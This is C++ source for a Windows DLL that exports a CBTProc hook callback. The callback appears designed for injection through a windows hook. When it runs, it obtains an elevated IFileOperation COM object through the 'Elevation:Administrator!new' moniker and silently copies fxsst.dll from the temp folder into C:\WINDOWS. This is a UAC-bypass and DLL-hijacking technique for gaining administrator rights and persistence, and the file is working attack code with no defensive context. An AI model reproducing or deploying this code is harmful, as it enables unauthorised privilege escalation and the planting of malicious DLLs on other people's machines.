// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

#pragma comment(lib,"Ole32.lib") 
#pragma comment(lib,"User32.lib")
#pragma comment(lib, "Shell32.lib")

HMODULE hModuleGlobal = NULL; // Global variable to hold the module handle

HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, void** ppv)
{
	BIND_OPTS3 bo;
	WCHAR wszCLSID[50];
	WCHAR wszMon[300];
	StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID) / sizeof(wszCLSID[0]));
	HRESULT hr = StringCchPrintfW(wszMon, sizeof(wszMon) / sizeof(wszMon[0]), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
		return hr;
	memset(&bo, 0, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.hwnd = hwnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
	return CoGetObject(wszMon, &bo, riid, ppv);
}

void ElevatedCopy()
{
    // This is only available on Vista and higher
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (FAILED(hr))
    {
        return;
    }
    IFileOperation* pfo;
    hr = CoCreateInstanceAsAdmin(NULL, CLSID_FileOperation, IID_PPV_ARGS(&pfo));
    if (FAILED(hr))
    {
        return;
    }
    pfo->SetOperationFlags(FOF_NO_UI);
    IShellItem* from = NULL, * to = NULL;
    // Get the %TEMP% directory
    wchar_t szTempDir[MAX_PATH];
    GetTempPathW(MAX_PATH, szTempDir);
    // Get the long form of the path
    wchar_t szLongTempDir[MAX_PATH];
    GetLongPathNameW(szTempDir, szLongTempDir, MAX_PATH);
    // Calculate the number of backslashes in the original path
    int numBackslashes = 0;
    for (int i = 0; szLongTempDir[i] != '\0'; i++)
    {
        if (szLongTempDir[i] == '\\')
        {
            numBackslashes++;
        }
    }
    // Calculate the length of the new string
    size_t len = wcslen(szLongTempDir) + numBackslashes + wcslen(L"\\fxsst.dll") + 1;
    // Allocate memory for the new string
    wchar_t* szFxsstDllPath = new wchar_t[len];
    // Build the full path for the DLL, escaping the backslashes
    int j = 0;
    for (int i = 0; szLongTempDir[i] != '\0'; i++)
    {
        if (szLongTempDir[i] == '\\')
        {
            szFxsstDllPath[j++] = '\\';
            szFxsstDllPath[j++] = '\\';
        }
        else
        {
            szFxsstDllPath[j++] = szLongTempDir[i];
        }
    }
    // Append the DLL name
    wcscat_s(szFxsstDllPath, len, L"\\fxsst.dll");
    MessageBox(NULL, szFxsstDllPath, L"dll", MB_OK);
    hr = SHCreateItemFromParsingName(szFxsstDllPath, NULL, IID_PPV_ARGS(&from));
    if (FAILED(hr))
    {
        return;
    }
    hr = SHCreateItemFromParsingName(L"C:\\WINDOWS\\", NULL, IID_PPV_ARGS(&to));
    if (FAILED(hr))
    {
        return;
    }
    pfo->CopyItem(from, to, L"fxsst.dll", NULL);
    pfo->PerformOperations();
    from->Release();
    to->Release();
    pfo->Release();
    if(szFxsstDllPath)
        delete[] szFxsstDllPath;
    CoUninitialize();
}

extern "C" __declspec(dllexport) LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    // increase the DLL reference counter to stop unloading.
    if (nCode >= 0 && hModuleGlobal == NULL)
    {
        TCHAR szModulePath[MAX_PATH];
        GetModuleFileName(hModuleGlobal, szModulePath, MAX_PATH);
        hModuleGlobal = LoadLibrary(szModulePath);
        ElevatedCopy();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	// unused 
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:       
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}